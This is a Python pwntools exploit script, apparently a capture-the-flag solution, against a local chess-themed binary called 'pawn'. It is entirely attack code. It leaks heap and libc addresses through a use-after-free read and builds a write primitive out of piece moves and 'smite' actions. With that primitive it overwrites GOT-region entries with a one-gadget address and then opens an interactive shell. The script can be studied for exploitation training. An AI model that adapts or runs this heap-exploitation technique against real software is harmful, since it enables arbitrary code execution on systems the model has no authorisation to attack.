from pwn import *

context.log_level = 'error'
def new(idx):
    r.sendlineafter('5', '1')
    r.sendlineafter('?', str(idx))
def show(idx):
    r.sendlineafter('5', '2')
    r.sendlineafter('?', str(idx))
def move(idx, x, y, nx, ny):
    r.sendlineafter('5', '3')
    r.sendlineafter('?', str(idx))
    r.sendlineafter('spaces.\n', str(x)+' '+str(y))
    r.sendlineafter('spaces.\n', str(nx)+' '+str(ny))
def smite(idx, x, y):
    r.sendlineafter('5', '4')
    r.sendlineafter('?', str(idx))
    r.sendlineafter('spaces.\n', str(x)+' '+str(y))
def delete(idx):
    r.sendlineafter('5', '5')
    r.sendlineafter('?', str(idx))
def add_t(x, y=0):
    while(x!=0):
        if(y!=1):
            move(0, 1, 0, 0, 2)
            x-=1
        if(x!=0):
            move(0, 0, 2, 1, 0)    
            x-=1
        y = 0 

def pwn():
    new(0)
    new(1)
    new(2)
    delete(1)
    delete(0)
    show(0)
    r.recvuntil('0 ')    
    heap = u64(r.recvline().rstrip().ljust(8, b'\x00'))
    if(p8(heap&0xff).isalpha()!=True or p8((heap>>8)&0xff).isalpha()!=True or p8((heap>>16)&0xff).isalpha()!=True or heap >= 0x1000000):
        r.close()
        return -1
    log.success('Heap @ '+hex(heap))
    new(0)
    add_t(0x40)
    smite(0, 0x119, 0)
    smite(0, 0x11a, 0)
    add_t(0x40)
    smite(0, 0x118, 0)
    show(2)
    r.recvuntil('5 ')
    libc = u64(r.recvline().rstrip().ljust(8, b'\x00'))
    log.success('Libc @ '+hex(libc))
    new(3)
    delete(3)
    where = libc-0xb70
    og = libc-0x105a1f
    add_t(0x100-0x80)
    
    t = 0
    i = 0
    y = 0
    while(i<8):
        byte = (where >> (8*i))&0xff
        if(byte<t&0xff):
            add_t(0x100-t&0xff, y)
            y = 0
            t = 0
        
        add_t(byte-t&0xff, y)
        t=byte
        smite(0, 0x404020+i-heap+0x50, 0)
        i+=1
        if byte&1==1:
            y = 1
        else:
            y = 0
     
    y = 0
    i = 0
    while(i<7):
        byte = (og >> (8*i))&0xff
        if(byte<t&0xff):
            add_t(0x100-t&0xff, y)
            y = 0
            t = 0

        add_t(byte-t&0xff, y)
        t=byte
        smite(0, 0x404060+i-heap+0x50, 0)
        i+=1
        if byte&1==1:
            y = 1
        else:
            y = 0
    
    delete(2) 
    add_t(0x20)
    smite(0, 0x140, 0)
    add_t(0x20)
    smite(0, 0x141, 0)
    smite(0, 0x142, 0)
    new(1)
    new(3)
    new(1)
    
    r.interactive()

j = -1
while(j==-1):
    r = process('./pawn')
    j = pwn()

